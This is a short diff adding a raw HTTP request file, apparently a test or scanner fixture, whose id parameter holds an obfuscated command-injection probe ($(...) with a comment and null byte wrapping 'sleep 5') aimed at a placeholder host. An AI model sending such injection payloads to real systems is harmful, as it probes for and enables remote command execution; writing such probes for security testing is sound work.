@@ -1,0 +1,4 @@
+GET /a?id=$(/*%00*/sleep%205) HTTP/1.1
+Host: demo.example.com
+Connection: close
+
